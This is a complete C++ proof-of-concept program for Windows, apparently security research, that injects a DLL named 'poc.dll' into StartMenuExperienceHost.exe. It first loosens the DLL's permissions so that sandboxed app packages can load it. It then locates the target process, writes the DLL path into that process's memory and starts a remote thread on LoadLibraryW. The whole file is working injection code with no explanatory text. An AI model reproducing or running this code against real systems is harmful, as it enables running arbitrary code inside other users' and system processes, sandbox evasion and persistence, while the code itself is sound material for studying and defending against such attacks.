#include <Windows.h>
#include <AccCtrl.h>
#include <TlHelp32.h>

#include <cstdint>
#include <AclAPI.h>

bool GrantGroupAccessToObject(const wchar_t* objectName, const wchar_t* groupName, SE_OBJECT_TYPE objectType, DWORD permissions)
{
    PACL pOldDACL = NULL, pNewDACL = NULL;
    EXPLICIT_ACCESS ea;
    PSECURITY_DESCRIPTOR pSD = NULL;

    if (GetNamedSecurityInfo(objectName, objectType, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, &pSD) < 0)
    {
        return false;
    }

    ZeroMemory(&ea, sizeof(ea));
    ea.grfAccessPermissions = permissions;
    ea.grfAccessMode = GRANT_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)groupName;

    if (SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL) < 0)
    {
        return false;
    }

    if (SetNamedSecurityInfo((LPWSTR)objectName, objectType, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL) < 0)
    {
        return false;
    }

    if (pNewDACL)
        LocalFree(pNewDACL);
    if (pSD)
        LocalFree(pSD);

    return true;
}

LPVOID GetFnAddress(const wchar_t* moduleName, const char* fnName)
{
    bool needFreeLibrary = false;
    HMODULE hModule = GetModuleHandle(moduleName);
    if (!hModule)
    {
        hModule = LoadLibrary(moduleName);
        if (!hModule)
        {
            return (LPVOID)0;
        }
        needFreeLibrary = true;
    }

    FARPROC hFn = GetProcAddress(hModule, fnName);

    if (needFreeLibrary)
    {
        FreeLibrary(hModule);
    }

    return (LPVOID)hFn;
};

DWORD FindProcessPID(const wchar_t* processName, int32_t sessionId = -1)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    DWORD pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (_wcsnicmp(entry.szExeFile, processName, sizeof(entry.szExeFile) / sizeof(wchar_t)) == 0)
            {
                DWORD processSessionId = -1;
                if (sessionId == -1 || (ProcessIdToSessionId(entry.th32ProcessID, &processSessionId) && processSessionId == sessionId))
                {
                    pid = entry.th32ProcessID;
                    break;
                }
            }
        }
    }

    CloseHandle(snapshot);
    return pid;
};

DWORD GetCurrentSessionId()
{
    DWORD sessionId = -1;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    return sessionId;
}

template <typename Callback>
LPVOID WriteToRemoteProcess(HANDLE hProcess, Callback callback)
{
    LPVOID address = VirtualAllocEx(hProcess, NULL, 0x4000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!address)
    {
        return address;
    }

    if (!callback(hProcess, address))
    {
        VirtualFreeEx(hProcess, address, 0x4000, MEM_FREE);
        return NULL;
    }

    return address;
};

bool CreateRemoteThreadInProcess(HANDLE hProcess, LPVOID parameter, LPVOID threadProc)
{
    DWORD ret = WAIT_FAILED;
    HANDLE hndl = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)threadProc, parameter, NULL, NULL);
    if (hndl)
    {
        ret = WaitForSingleObject(hndl, 30000);
        CloseHandle(hndl);
        hndl = NULL;
    }
    return ret == WAIT_OBJECT_0;
};

template <typename WriteArgsCallback>
bool ExecuteFnInRemoteProcess(const wchar_t* processName, const wchar_t* moduleName, const char* fnName, WriteArgsCallback callback)
{
    DWORD targetProcessPID = FindProcessPID(processName);
    if (targetProcessPID == -1)
    {
        return false;
    }

    OutputDebugStringA("Found PID\n");
    HANDLE processHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, targetProcessPID);
    if (processHandle == 0)
    {
        return false;
    }

    OutputDebugStringA("Opened process\n");
    LPVOID argsRemoteAddress = WriteToRemoteProcess(processHandle, callback);
    if (argsRemoteAddress == 0)
    {
        return false;
    }

    OutputDebugStringA("Wrote memory to remote process\n");
    if (!CreateRemoteThreadInProcess(processHandle, argsRemoteAddress, GetFnAddress(moduleName, fnName)))
    {
        return false;
    }

    OutputDebugStringA("Created remote thread in remote process\n");
    return true;
}

int wmain()
{
    const wchar_t dllName[] = L"poc.dll";
    wchar_t fullDllName[MAX_PATH];
    GetFullPathNameW(dllName, sizeof(fullDllName) / sizeof(wchar_t), fullDllName, NULL);
    GrantGroupAccessToObject(fullDllName, L"ALL APPLICATION PACKAGES", SE_FILE_OBJECT, GENERIC_READ | GENERIC_EXECUTE);
    ExecuteFnInRemoteProcess(L"StartMenuExperienceHost.exe", L"kernel32.dll", "LoadLibraryW", [fullDllName](HANDLE hProcess, LPVOID address)
        {
            WriteProcessMemory(hProcess, address, fullDllName, (wcslen(fullDllName) + 1) * sizeof(wchar_t), NULL);
            return true;
        });
	return 0;
}